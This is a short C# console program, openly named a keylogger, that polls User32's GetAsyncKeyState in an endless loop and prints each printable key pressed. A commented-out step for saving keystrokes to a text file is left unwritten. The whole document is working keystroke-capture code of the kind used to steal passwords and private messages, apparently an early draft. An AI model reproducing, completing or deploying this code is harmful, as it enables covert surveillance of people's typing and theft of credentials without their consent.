using System;
using System.Runtime.InteropServices;
using System.Threading;

namespace keylogger
{
    class Program
    {
        [DllImport("User32.dll")]
        public static extern int GetAsyncKeyState(Int32 i);
        static void Main(string[] args)
        {
            //
            //Capture the keystrokes
            //
            while (true)
            {
                //pause and let other programs get a chance to run
                Thread.Sleep(5);

                //check all keys for their state (range is from ASCII table)
                for (int i = 32; i < 127; i++)
                {
                    int keyState = GetAsyncKeyState(i);
                    //if(keyState!=0) {Console.Write(keyState);} need to do this first then use the number we getr
                    if (keyState == 32769)
                    {
                        Console.Write((char)i+" "+i+'|');
                    }
                }
            
            }

            //
            //Store the strokes into a text file
            //
            
        }
    }
}
